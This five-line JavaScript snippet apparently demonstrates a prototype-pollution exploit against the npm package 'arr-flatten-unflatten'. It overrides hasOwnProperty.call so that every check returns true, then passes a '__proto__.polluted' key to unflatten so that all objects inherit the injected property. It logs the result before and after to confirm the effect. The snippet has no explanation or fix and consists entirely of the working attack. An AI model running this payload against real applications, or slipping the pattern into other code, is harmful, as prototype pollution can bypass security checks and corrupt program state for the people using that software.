Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const {unflatten} = require('arr-flatten-unflatten');
unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);